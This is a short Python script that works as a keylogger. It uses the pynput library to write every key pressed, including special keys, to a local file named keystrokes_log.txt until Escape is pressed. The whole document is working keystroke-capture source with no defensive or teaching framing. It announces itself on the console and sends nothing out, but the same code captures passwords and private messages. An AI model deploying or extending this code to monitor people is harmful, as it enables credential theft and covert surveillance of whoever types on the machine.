from pynput import keyboard

# File to save keystrokes
log_file = "keystrokes_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Special keys like space, enter, etc.
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    # Stop listener if Escape is pressed
    if key == keyboard.Key.esc: 
        return False

# Start listening to keyboard
print("🔴 Logging started... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
